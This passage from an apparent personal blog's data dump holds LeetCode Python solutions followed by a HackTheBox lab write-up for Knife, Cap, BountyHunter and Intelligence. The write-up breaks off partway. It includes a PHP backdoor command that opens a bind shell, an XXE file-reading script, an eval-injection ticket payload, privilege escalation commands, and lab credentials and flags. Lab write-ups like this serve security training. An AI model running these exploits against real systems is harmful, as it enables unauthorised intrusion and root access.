num_list[_] + result else: diff = num_list[_] - 5 mod = num_list[_] % 5 if diff == -1: result = &quot;IV&quot; + result elif mod &lt; 4: result = &quot;V&quot; + &quot;I&quot; * mod + result else: result = &quot;IX&quot; + result elif _ == 1: if num_list[_] == 0: continue elif num_list[_] &lt;= 3: result = &quot;X&quot; * num_list[_] + result else: diff = num_list[_] - 5 mod = num_list[_] % 5 if diff == -1: result = &quot;XL&quot; + result elif mod &lt; 4: result = &quot;L&quot; + &quot;X&quot; * mod + result else: result = &quot;XC&quot; + result elif _ == 2: if num_list[_] == 0: continue elif num_list[_] &lt;= 3: result = &quot;C&quot; * num_list[_] + result else: diff = num_list[_] - 5 mod = num_list[_] % 5 if diff == -1: result = &quot;CD&quot; + result elif mod &lt; 4: result = &quot;D&quot; + &quot;C&quot; * mod + result else: result = &quot;CM&quot; + result elif _ == 3: result = &quot;M&quot; * num_list[_] + result return(result) ä¸€ä¸ªæŒºä¸­åº¸çš„è§£å†³æ–¹æ¡ˆ ä¸ºäº†è§£å†³é—®é¢˜è€Œè§£å†³é—®é¢˜ ç½—é©¬æ•°å­—è½¬æ•´æ•° ç½—é©¬æ•°å­—åŒ…å«ä»¥ä¸‹ä¸ƒç§å­—ç¬¦:Iï¼ŒVï¼ŒXï¼ŒLï¼ŒCï¼ŒDå’ŒMã€‚ 12345678å­—ç¬¦ æ•°å€¼I 1V 5X 10L 50C 100D 500M 1000 ä¾‹å¦‚ï¼Œç½—é©¬æ•°å­—2å†™åšIIï¼Œå³ä¸ºä¸¤ä¸ªå¹¶åˆ—çš„1ã€‚12å†™åšXIIï¼Œå³ä¸ºX+IIã€‚ 27å†™åšXXVII, å³ä¸ºXX+V+IIã€‚ é€šå¸¸æƒ…å†µä¸‹ï¼Œç½—é©¬æ•°å­—ä¸­å°çš„æ•°å­—åœ¨å¤§çš„æ•°å­—çš„å³è¾¹ã€‚ä½†ä¹Ÿå­˜åœ¨ç‰¹ä¾‹ï¼Œä¾‹å¦‚4ä¸å†™åšIIIIï¼Œè€Œæ˜¯IVã€‚æ•°å­—1åœ¨æ•°å­—5çš„å·¦è¾¹ï¼Œæ‰€è¡¨ç¤ºçš„æ•°ç­‰äºå¤§æ•°5å‡å°æ•°1å¾—åˆ°çš„æ•°å€¼4 ã€‚åŒæ ·åœ°ï¼Œæ•°å­—9è¡¨ç¤ºä¸ºIXã€‚è¿™ä¸ªç‰¹æ®Šçš„è§„åˆ™åªé€‚ç”¨äºä»¥ä¸‹å…­ç§æƒ…å†µï¼š Iå¯ä»¥æ”¾åœ¨V(5) å’ŒX(10) çš„å·¦è¾¹ï¼Œæ¥è¡¨ç¤º 4 å’Œ 9ã€‚ Xå¯ä»¥æ”¾åœ¨L(50) å’ŒC(100) çš„å·¦è¾¹ï¼Œæ¥è¡¨ç¤º 40 å’Œ90ã€‚ Cå¯ä»¥æ”¾åœ¨D(500) å’ŒM(1000) çš„å·¦è¾¹ï¼Œæ¥è¡¨ç¤º400 å’Œ900ã€‚ ç»™å®šä¸€ä¸ªç½—é©¬æ•°å­—ï¼Œå°†å…¶è½¬æ¢æˆæ•´æ•°ã€‚è¾“å…¥ç¡®ä¿åœ¨ 1åˆ° 3999 çš„èŒƒå›´å†…ã€‚ ç¤ºä¾‹1: 12è¾“å…¥:&quot;III&quot;è¾“å‡º: 3 ç¤ºä¾‹2: 12è¾“å…¥:&quot;IV&quot;è¾“å‡º: 4 ç¤ºä¾‹3: 12è¾“å…¥:&quot;IX&quot;è¾“å‡º: 9 ç¤ºä¾‹4: 123è¾“å…¥:&quot;LVIII&quot;è¾“å‡º: 58è§£é‡Š: L &#x3D; 50, V&#x3D; 5, III &#x3D; 3. ç¤ºä¾‹5: 123è¾“å…¥:&quot;MCMXCIV&quot;è¾“å‡º: 1994è§£é‡Š: M &#x3D; 1000, CM &#x3D; 900, XC &#x3D; 90, IV &#x3D; 4. æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰ é“¾æ¥ï¼šhttps://leetcode-cn.com/problems/roman-to-integer è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135class Solution: def romanToInt(self, s: str) -&gt; int: length = len(s) number = 0 if s[0] == &quot;M&quot;: _ = 0 while s[_] == &quot;M&quot;: _ += 1 if _ == length: break s = s[_:] number += 1000 * _ length -= _ if length == 0: return(number) if s[0] == &quot;C&quot;: if length == 1: number += 100 length -= 1 elif s[1] == &quot;M&quot;: number += 900 length -= 2 s = s[2:] elif s[1] == &quot;D&quot;: number += 400 length -= 2 s = s[2:] else: _ = 0 while s[_] == &quot;C&quot;: _ += 1 if _ == length: break s = s[_:] number += 100 * _ length -= _ if length == 0: return(number) if s[0] == &quot;D&quot;: number += 500 length -= 1 s = s[1:] if length == 0: return(number) _ = 0 if s[_] == &quot;C&quot;: while s[_] == &quot;C&quot;: _ += 1 if _ == length: break s = s[_:] number += 100 * _ length -= _ if length == 0: return(number) if s[0] == &quot;X&quot;: if length == 1: number += 10 length -= 1 elif s[1] == &quot;C&quot;: number += 90 length -= 2 s = s[2:] elif s[1] == &quot;L&quot;: number += 40 length -= 2 s = s[2:] else: _ = 0 while s[_] == &quot;X&quot;: _ += 1 if _ == length: break s = s[_:] number += 10 * _ length -= _ if length == 0: return(number) if s[0] == &quot;L&quot;: number += 50 length -= 1 s = s[1:] if length == 0: return(number) _ = 0 if s[_] == &quot;X&quot;: while s[_] == &quot;X&quot;: _ += 1 if _ == length: break s = s[_:] number += 10 * _ length -= _ if length == 0: return(number) if s[0] == &quot;I&quot;: if length == 1: number += 1 length -= 1 elif s[1] == &quot;X&quot;: number += 9 length -= 2 s = s[2:] elif s[1] == &quot;V&quot;: number += 4 length -= 2 s = s[2:] else: _ = 0 while s[_] == &quot;I&quot;: _ += 1 if _ == length: break s = s[_:] number += 1 * _ length -= _ if length == 0: return(number) if s[0] == &quot;V&quot;: number += 5 length -= 1 s = s[1:] if length == 0: return(number) _ = 0 if s[_] == &quot;I&quot;: while s[_] == &quot;I&quot;: _ += 1 if _ == length: break s = s[_:] number += 1 * _ length -= _ if length == 0: return(number) å®åœ¨æƒ³ä¸å‡ºå•¥å¥½çš„ç®—æ³•äº† åªèƒ½æ‘†çƒ‚äº† æœ€é•¿å…¬å…±å‰ç¼€ ç¼–å†™ä¸€ä¸ªå‡½æ•°æ¥æŸ¥æ‰¾å­—ç¬¦ä¸²æ•°ç»„ä¸­çš„æœ€é•¿å…¬å…±å‰ç¼€ã€‚ å¦‚æœä¸å­˜åœ¨å…¬å…±å‰ç¼€ï¼Œè¿”å›ç©ºå­—ç¬¦ä¸²&quot;&quot;ã€‚ ç¤ºä¾‹ 1ï¼š 12è¾“å…¥ï¼šstrs &#x3D; [&quot;flower&quot;,&quot;flow&quot;,&quot;flight&quot;]è¾“å‡ºï¼š&quot;fl&quot; ç¤ºä¾‹ 2ï¼š 123è¾“å…¥ï¼šstrs &#x3D; [&quot;dog&quot;,&quot;racecar&quot;,&quot;car&quot;]è¾“å‡ºï¼š&quot;&quot;è§£é‡Šï¼šè¾“å…¥ä¸å­˜åœ¨å…¬å…±å‰ç¼€ã€‚ æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰ é“¾æ¥ï¼šhttps://leetcode-cn.com/problems/longest-common-prefix è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚ 1234567891011121314class Solution: def longestCommonPrefix(self, strs: List[str]) -&gt; str: length = 0 if len(strs) == 1: return(strs[0]) if &quot;&quot; in strs: return(&quot;&quot;) while True: for _ in range(1, len(strs)): if not strs[_].startswith(strs[0][:length]): return(strs[0][:length-1]) if length == len(strs[0]): return(strs[0]) length += 1 æ‡’å¾—å†™åŒ¹é… ç›´æ¥ç”¨startswithäº† ä¸‰æ•°ä¹‹å’Œ ç»™ä½ ä¸€ä¸ªåŒ…å«nä¸ªæ•´æ•°çš„æ•°ç»„numsï¼Œåˆ¤æ–­numsä¸­æ˜¯å¦å­˜åœ¨ä¸‰ä¸ªå…ƒç´  aï¼Œbï¼Œc ï¼Œä½¿å¾—a + b + c = 0 ï¼Ÿè¯·ä½ æ‰¾å‡ºæ‰€æœ‰å’Œä¸º0ä¸”ä¸é‡å¤çš„ä¸‰å…ƒç»„ã€‚ æ³¨æ„ï¼šç­”æ¡ˆä¸­ä¸å¯ä»¥åŒ…å«é‡å¤çš„ä¸‰å…ƒç»„ã€‚ ç¤ºä¾‹ 1ï¼š 12è¾“å…¥ï¼šnums &#x3D; [-1,0,1,2,-1,-4]è¾“å‡ºï¼š[[-1,-1,2],[-1,0,1]] ç¤ºä¾‹ 2ï¼š 12è¾“å…¥ï¼šnums &#x3D; []è¾“å‡ºï¼š[] ç¤ºä¾‹ 3ï¼š 12è¾“å…¥ï¼šnums &#x3D; [0]è¾“å‡ºï¼š[] æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰ é“¾æ¥ï¼šhttps://leetcode-cn.com/problems/3sum è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚ 1234567891011121314151617181920212223242526272829303132class Solution: def threeSum(self, nums: List[int]) -&gt; List[List[int]]: nums.sort() length = len(nums) if length &lt; 3: return([]) neg_count = 0 for _ in nums: if _ &lt; 0: neg_count += 1 elif _ == 0: neg_count += 1 break if neg_count == 0 or nums[-1] &lt; 0: return([]) result = [] for _ in range(0, neg_count): c = -nums[_] a = _ + 1 b = length - 1 while a &lt; b: if nums[a] + nums[b] == c: temp = [-c, nums[a], nums[b]] if temp not in result: result.append(temp) a += 1 b -= 1 elif nums[a] + nums[b] &gt; c: b -= 1 elif nums[a] + nums[b] &lt; c: a += 1 return(result) å®åœ¨æƒ³ä¸å‡ºæ¥å’‹åšï¼Œçœ‹äº†ä¸‹åˆ«äººçš„é¢˜è§£ ä¸‰ä¸ªæ•°ä¹‹å’Œä¸º0åœ¨é™¤äº†ä¸‰ä¸ªæ•°éƒ½ä¸º0çš„æƒ…å†µä¸‹ï¼Œè‡³å°‘æœ‰ä¸€ä¸ªè´Ÿæ•°çš„å­˜åœ¨ éå†æ‰€æœ‰çš„è´Ÿæ•°ï¼Œä¸¤ä¸ªä¸‹æ ‡åˆ†åˆ«æŒ‡å‘cçš„ä¸‹ä¸€ä½ä¸ç»“å°¾ é€šè¿‡a+bä¸-cçš„å…³ç³»æ¥ç§»åŠ¨aã€b æœ€æ¥è¿‘çš„ä¸‰æ•°ä¹‹å’Œ ç»™å®šä¸€ä¸ªåŒ…æ‹¬nä¸ªæ•´æ•°çš„æ•°ç»„numså’Œä¸€ä¸ªç›®æ ‡å€¼targetã€‚æ‰¾å‡ºnumsä¸­çš„ä¸‰ä¸ªæ•´æ•°ï¼Œä½¿å¾—å®ƒä»¬çš„å’Œä¸targetæœ€æ¥è¿‘ã€‚è¿”å›è¿™ä¸‰ä¸ªæ•°çš„å’Œã€‚å‡å®šæ¯ç»„è¾“å…¥åªå­˜åœ¨å”¯ä¸€ç­”æ¡ˆã€‚ ç¤ºä¾‹ï¼š 123è¾“å…¥ï¼šnums &#x3D; [-1,2,1,-4], target &#x3D; 1è¾“å‡ºï¼š2è§£é‡Šï¼šä¸ target æœ€æ¥è¿‘çš„å’Œæ˜¯ 2 (-1 + 2 + 1 &#x3D; 2) ã€‚ æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰ é“¾æ¥ï¼šhttps://leetcode-cn.com/problems/3sum-closest è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980class Solution: def threeSumClosest(self, nums: List[int], target: int) -&gt; int: length = len(nums) if length &lt; 3: return([]) nums.sort() if target &gt;= 0: if target &lt; nums[0]: return(nums[0] + nums[1] + nums[2]) neg_count = 0 for _ in nums: if _ &lt; target: neg_count += 1 elif _ == target: neg_count += 1 break sub = 9999 result = 0 for _ in range(0, neg_count): c = -nums[_] a = _ + 1 b = length - 1 while a &lt; b: if sub == 0: break if nums[a] + nums[b] == c + target: result = target sub = 0 break elif nums[a] + nums[b] &gt; c + target: temp = abs(nums[a] + nums[b] - c - target) if temp &lt; sub: sub = temp result = nums[a] + nums[b] - c b -= 1 elif nums[a] + nums[b] &lt; c + target: temp = abs(nums[a] + nums[b] - c - target) if temp &lt; sub: sub = temp result = nums[a] + nums[b] - c a += 1 return(result) elif target &lt; 0: nums = nums[::-1] print(nums) if target &gt; nums[0]: return(nums[0] + nums[1] + nums[2]) neg_count = 0 for _ in nums: if _ &gt; target: neg_count += 1 elif _ == target: neg_count += 1 break sub = 9999 result = 0 for _ in range(0, neg_count): c = -nums[_] a = _ + 1 b = length - 1 while a &lt; b: if sub == 0: break if nums[a] + nums[b] == c + target: result = target sub = 0 break elif nums[a] + nums[b] &gt; c + target: temp = abs(nums[a] + nums[b] - c - target) if temp &lt; sub: sub = temp result = nums[a] + nums[b] - c a += 1 elif nums[a] + nums[b] &lt; c + target: temp = abs(nums[a] + nums[b] - c - target) if temp &lt; sub: sub = temp result = nums[a] + nums[b] - c b -= 1 return(result) è·Ÿä¸Šä¸€é¢˜å·®ä¸å¤šçš„æ€è·¯ï¼ŒåŠ äº†ç‚¹å˜åŒ–ç½¢äº† åˆ†äº†targetæ­£è´Ÿä¸¤ç§æƒ…å†µæ¥å¤„ç† ä½†æ˜¯å†™å¾—å¤ªæ‹‰äº† ç®—æ³•å°±å›¾ä¸€ä¹ï¼Œæ”¶æ”¶å¿ƒå¹²å®‰æœè¾£ EOF","categories":[{"name":"Study","slug":"Study","permalink":"https://yoloyolo.top/categories/Study/"}],"tags":[{"name":"LeetCode","slug":"LeetCode","permalink":"https://yoloyolo.top/tags/LeetCode/"}]},{"title":"HachTheBox_Set_2","slug":"HackTheBox-Set-2","date":"2021-09-05T07:10:51.000Z","updated":"2023-02-14T15:31:13.000Z","comments":true,"path":"2021/09/05/HackTheBox-Set-2/","link":"","permalink":"https://yoloyolo.top/2021/09/05/HackTheBox-Set-2/","excerpt":"éšç¼˜æ›´æ–°","text":"éšç¼˜æ›´æ–° HachTheBox_Knife ç«¯å£æ‰«æ 123456789nmap -sV -Pn -T5 10.10.10.242Nmap scan report for 10.10.10.242Host is up (0.36s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22&#x2F;tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)80&#x2F;tcp open http Apache httpd 2.4.41 ((Ubuntu))Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel æ¼æ´åˆ©ç”¨ å¾—åˆ°PHPç‰ˆæœ¬ä¿¡æ¯ 1234567curl -I http:&#x2F;&#x2F;10.10.10.242&#x2F;HTTP&#x2F;1.1 200 OKDate: Thu, 05 Aug 2021 05:54:34 GMTServer: Apache&#x2F;2.4.41 (Ubuntu)X-Powered-By: PHP&#x2F;8.1.0-devContent-Type: text&#x2F;html; charset&#x3D;UTF-8 æŸ¥è¯¢å¾—åˆ°ç›¸å…³æ¼æ´ 123456789searchsploit php 8.1 dev----------------------------------------------------------- --------------------------------- Exploit Title | Path----------------------------------------------------------- ---------------------------------PHP 8.1.0-dev - &#39;User-Agentt&#39; Remote Code Execution | php&#x2F;webapps&#x2F;49933.py----------------------------------------------------------- ---------------------------------Shellcodes: No ResultsPapers: No Results å°†Bashå¼€æ”¾åˆ°ç›®æ ‡æœåŠ¡å™¨9876ç«¯å£ï¼Œå¹¶ç”¨ncè¿æ¥ 1curl -H &quot;User-Agentt: zerodiumsystem(&#39;mkfifo &#x2F;tmp&#x2F;bufferfly; cat &#x2F;tmp&#x2F;bufferfly | &#x2F;bin&#x2F;bash -i 2&gt;&amp;1 | nc -l 9876 &gt; &#x2F;tmp&#x2F;bufferfly&#39;);&quot; http:&#x2F;&#x2F;10.10.10.242&#x2F; 1234nc 10.10.10.242 9876cat &#x2F;home&#x2F;james&#x2F;user.txt71a8b414816d223319c095a64edbae6c æƒé™æå‡ æŸ¥çœ‹sudoæƒé™ 1234567sudo -lMatching Defaults entries for james on knife: env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\\:&#x2F;usr&#x2F;local&#x2F;bin\\:&#x2F;usr&#x2F;sbin\\:&#x2F;usr&#x2F;bin\\:&#x2F;sbin\\:&#x2F;bin\\:&#x2F;snap&#x2F;binUser james may run the following commands on knife: (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;knife 1234sudo -u root knife exec --exec &quot;exec &#39;&#x2F;bin&#x2F;bash -i&#39;&quot;cat &#x2F;root&#x2F;root.txt6fa9527622b5b0396511a575bd529b42 HachTheBox_Cap ç«¯å£æ‰«æ 12345678910nmap -sV -Pn -T5 10.10.10.245Nmap scan report for 10.10.10.245Host is up (0.28s latency).Not shown: 997 closed portsPORT STATE SERVICE VERSION21&#x2F;tcp open ftp vsftpd 3.0.322&#x2F;tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)80&#x2F;tcp open http gunicornService Info: OSs: Unix, Linux; CPE: cpe:&#x2F;o:linux:linux_kernel æ¼æ´åˆ©ç”¨ ä¸‹è½½æµé‡åŒ… 12curl -O http:&#x2F;&#x2F;10.10.10.245&#x2F;download&#x2F;0wireshark 0 å¾—åˆ°FTPç™»å…¥å‡­è¯ 1nathan:Buck3tH4TF0RM3! 12ssh nathan@10.10.10.245Buck3tH4TF0RM3! 123cat &#x2F;home&#x2F;nathan&#x2F;user.txtf514ef062a27e672c5e88001061d8c5a æƒé™æå‡ æŸ¥çœ‹capability 1234567getcap &#x2F;* -r 2&gt;&#x2F;dev&#x2F;null&#x2F;usr&#x2F;bin&#x2F;python3.8 &#x3D; cap_setuid,cap_net_bind_service+eip&#x2F;usr&#x2F;bin&#x2F;ping &#x3D; cap_net_raw+ep&#x2F;usr&#x2F;bin&#x2F;traceroute6.iputils &#x3D; cap_net_raw+ep&#x2F;usr&#x2F;bin&#x2F;mtr-packet &#x3D; cap_net_raw+ep&#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;gstreamer1.0&#x2F;gstreamer-1.0&#x2F;gst-ptp-helper &#x3D; cap_net_bind_service,cap_net_admin+ep ä½¿ç”¨pythonè¿›è¡Œææƒ 1234&#x2F;usr&#x2F;bin&#x2F;python3.8 -c &#39;import os;os.setuid(0);os.system(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;cat &#x2F;root&#x2F;root.txt64941cc0edb38d723f72d34453780c90 HachTheBox_BountyHunter ç«¯å£æ‰«æ 123456789nmap -sV -Pn -T5 10.10.11.100Nmap scan report for 10.10.11.100Host is up (0.25s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22&#x2F;tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)80&#x2F;tcp open http Apache httpd 2.4.41 ((Ubuntu))Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel è·¯å¾„æ‰«æ 123dirb http:&#x2F;&#x2F;10.10.11.100&#x2F; -X .php+ http:&#x2F;&#x2F;10.10.11.100&#x2F;db.php (CODE:200|SIZE:0) æ¼æ´åˆ©ç”¨ 1234567891011121314151617181920import base64import reimport requestsreq &#x3D; requests.session()file &#x3D; input()payload &#x3D; &#123;&quot;data&quot;:base64.b64encode((&quot;&quot;&quot;&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&quot;&quot;&quot; + file + &quot;&quot;&quot;\\&quot;&gt;]&gt; &lt;bugreport&gt; &lt;title&gt;&amp;xxe;&lt;&#x2F;title&gt; &lt;cwe&gt;2&lt;&#x2F;cwe&gt; &lt;cvss&gt;3&lt;&#x2F;cvss&gt; &lt;reward&gt;4&lt;&#x2F;reward&gt; &lt;&#x2F;bugreport&gt;&quot;&quot;&quot;).encode()).decode()&#125;url &#x3D; &quot;http:&#x2F;&#x2F;10.10.11.100&#x2F;tracker_diRbPr00f314.php&quot;res&#x3D;req.post(url&#x3D;url, data&#x3D;payload)data &#x3D; res.textdata &#x3D; data.replace(&quot;\\n&quot;, &quot;&quot;)result &#x3D; base64.b64decode(re.findall(&quot;&lt;td&gt;Title:&lt;&#x2F;td&gt; &lt;td&gt;(.*?)&lt;&#x2F;td&gt;&quot;, data)[0].encode()).decode()print(result) è¯»å–/etc/passwd 1development:x:1000:1000:Development:&#x2F;home&#x2F;development:&#x2F;bin&#x2F;bash è¯»å–db.php 123456&#x2F;&#x2F; TODO -&gt; Implement login system with the database.$dbserver &#x3D; &quot;localhost&quot;;$dbname &#x3D; &quot;bounty&quot;;$dbusername &#x3D; &quot;admin&quot;;$dbpassword &#x3D; &quot;m19RoAU0hP41A1sTsq6K&quot;;$testuser &#x3D; &quot;test&quot;; ç™»å…¥SSHæœåŠ¡ 12ssh development@10.10.11.100m19RoAU0hP41A1sTsq6K 123cat &#x2F;home&#x2F;development&#x2F;user.txt96248cc10e05f03e3b63eb59adfd9d4c æƒé™æå‡ 1234567891011cat &#x2F;home&#x2F;development&#x2F;contract.txtHey team,I&#39;ll be out of the office this week but please make sure that our contract with Skytrain Inc gets completed.This has been our first job since the &quot;rm -rf&quot; incident and we can&#39;t mess this up. Whenever one of you gets on please have a look at the internal tool they sent over. There have been a handful of tickets submitted that have been failing validation and I need you to figure out why.I set up the permissions for you to test this. Good luck.-- John æŸ¥çœ‹sudoæƒé™ 12345678sudo -lMatching Defaults entries for development on bountyhunter: env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\\:&#x2F;usr&#x2F;local&#x2F;bin\\:&#x2F;usr&#x2F;sbin\\:&#x2F;usr&#x2F;bin\\:&#x2F;sbin\\:&#x2F;bin\\:&#x2F;snap&#x2F;binUser development may run the following commands on bountyhunter: (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;python3.8 &#x2F;opt&#x2F;skytrain_inc&#x2F;ticketValidator.py æŸ¥çœ‹pyæ–‡ä»¶ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253cat &#x2F;opt&#x2F;skytrain_inc&#x2F;ticketValidator.py#Skytrain Inc Ticket Validation System 0.1#Do not distribute this file.def load_file(loc): if loc.endswith(&quot;.md&quot;): return open(loc, &#39;r&#39;) else: print(&quot;Wrong file type.&quot;) exit()def evaluate(ticketFile): #Evaluates a ticket to check for ireggularities. code_line &#x3D; None for i,x in enumerate(ticketFile.readlines()): if i &#x3D;&#x3D; 0: if not x.startswith(&quot;# Skytrain Inc&quot;): return False continue if i &#x3D;&#x3D; 1: if not x.startswith(&quot;## Ticket to &quot;): return False print(f&quot;Destination: &#123;&#39; &#39;.join(x.strip().split(&#39; &#39;)[3:])&#125;&quot;) continue if x.startswith(&quot;__Ticket Code:__&quot;): code_line &#x3D; i+1 continue if code_line and i &#x3D;&#x3D; code_line: if not x.startswith(&quot;**&quot;): return False ticketCode &#x3D; x.replace(&quot;**&quot;, &quot;&quot;).split(&quot;+&quot;)[0] if int(ticketCode) % 7 &#x3D;&#x3D; 4: validationNumber &#x3D; eval(x.replace(&quot;**&quot;, &quot;&quot;)) if validationNumber &gt; 100: return True else: return False return Falsedef main(): fileName &#x3D; input(&quot;Please enter the path to the ticket file.\\n&quot;) ticket &#x3D; load_file(fileName) #DEBUG print(ticket) result &#x3D; evaluate(ticket) if (result): print(&quot;Valid ticket.&quot;) else: print(&quot;Invalid ticket.&quot;) ticket.closemain() eval()å¯ä»¥è¿›è¡Œæ‰§è¡Œå‘½ä»¤ æ„é€ æ¶æ„æ–‡æœ¬ 12345678cat &#x2F;tmp&#x2F;1.md# Skytrain Inc## Ticket to Bridgeport__Ticket Code:__**11+eval(&quot;__import__(&#39;os&#39;).system(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;)**##Issued: 2021&#x2F;06&#x2F;21#End Ticket ææƒ 12sudo -u root &#x2F;usr&#x2F;bin&#x2F;python3.8 &#x2F;opt&#x2F;skytrain_inc&#x2F;ticketValidator.py&#x2F;tmp&#x2F;1.md 123cat &#x2F;root&#x2F;root.txtd8b513ba7130a46641d2c65966f6b8e6 HachTheBox_Intelligence ç«¯å£æ‰«æ 12345678910111213141516171819nmap -sV -sT -Pn 10.10.10.248Nmap scan report for 10.10.10.248Host is up (0.21s latency).Not shown: 988 filtered portsPORT STATE SERVICE VERSION53&#x2F;tcp open domain Simple DNS Plus80&#x2F;tcp open http Microsoft IIS httpd 10.088&#x2F;tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2021-07-18 12:54:48Z)135&#x2F;tcp open msrpc Microsoft Windows RPC139&#x2F;tcp open netbios-ssn Microsoft Windows netbios-ssn389&#x2F;tcp open ldap Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)445&#x2F;tcp open microsoft-ds?464&#x2F;tcp open kpasswd5?593&#x2F;tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636&#x2F;tcp open ssl&#x2F;ldap Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)3268&#x2F;tcp open ldap Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)3269&#x2F;tcp open ssl&#x2F;ldap Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)Service Info: Host: DC; OS: Windows; CPE: cpe:&#x2F;o:microsoft:windows æ¼æ´åˆ©ç”¨ è®¿é—®80ç«¯å£ï¼Œå¯ä»¥çœ‹åˆ°ä¸»é¡µä¸Šæœ‰ä¸¤ä¸ªPDFçš„é“¾æ¥ å°è¯•æšä¸¾å…¶ä»–PDF 12345678910111213141516#pdf.pyimport requestsreq = requests.session()for i in range(3): for j in range(1, 13): for k in range(31): year = str(2020 + i) month = (&quot;0&quot; + str(j)) if len(str(j)) == 1 else str(j) day = (&quot;0&quot; + str(k)) if len(str(k)) == 1 else str(k) url = &quot;http://10.10.10.248/documents/&quot; + year + &quot;-&quot; + month + &quot;-&quot; + day + &quot;-upload.pdf&quot; res = req.get(url) if res.status_code == 200: filename = year + &quot;-&quot; + month + &quot;-&quot; + day + &quot;-upload.pdf&quot; print(filename) file = open(filename, &quot;wb&quot;) file.write(res.content) è·å–PDFçš„ç”¨æˆ·å 12345678#pdf.shfilelist=`ls *.pdf`filenum=`ls *.pdf|wc -l`for ((i=1;i&lt;=$filenum;i++))do filename[$&#123;i&#125;]=`ls *.pdf| sed -n $&#123;i&#125;p` echo `exiftool $&#123;filename[$&#123;i&#125;]&#125; | grep Creator | awk -F \\ &#x27;&#123;print \\$3&#125;&#x27;` &gt;&gt; userdone ä»2020-06-04-upload.pdfä¸­å¾—åˆ°ä¸€ä¸ªå¯†ç NewIntelligenceCorpUser9876 çˆ†ç ´SMB 123crackmapexec smb 10.10.10.248 -d intelligence -u user -p NewIntelligenceCorpUser9876SMB 10.10.10.248 445 DC [+] intelligence\\Tiffany.Molina:NewIntelligenceCorpUser9876 æŸ¥çœ‹SMBè·¯å¾„ 1234567891011smbmap -H 10.10.10.248 -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -d intelligence Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin C$ NO ACCESS Default share IPC$ READ ONLY Remote IPC IT READ ONLY NETLOGON READ ONLY Logon server share SYSVOL READ ONLY Logon server share Users READ ONLY è·å¾—user.txt 123smbclient &#x2F;&#x2F;10.10.10.248&#x2F;users -U Tiffany.Molina NewIntelligenceCorpUser9876cd Tiffany.Molina\\Desktop\\get user.txt 123cat user.txtbbfd0948d53d769c6ec2fcc02181fa7b æƒé™æå‡ è·å–powershellè„šæœ¬ 12smbclient &#x2F;&#x2F;10.10.10.248&#x2F;IT -U Tiffany.Molina NewIntelligenceCorpUser9876get downdetector.ps1 123456789101112cat downdetector.ps1# Check web server status. Scheduled to run every 5minImport-Module ActiveDirectory foreach($record in Get-ChildItem &quot;AD:DC&#x3D;intelligence.htb,CN&#x3D;MicrosoftDNS,DC&#x3D;DomainDnsZones,DC&#x3D;intelligence,DC&#x3D;htb&quot; | Where-Object Name -like &quot;web*&quot;) &#123;try &#123;$request &#x3D; Invoke-WebRequest -Uri &quot;http:&#x2F;&#x2F;$($record.Name)&quot; -UseDefaultCredentialsif(.StatusCode -ne 200) &#123;Send-MailMessage -From &#39;Ted Graves &lt;Ted.Graves@intelligence.htb&gt;&#39; -To &#39;Ted Graves 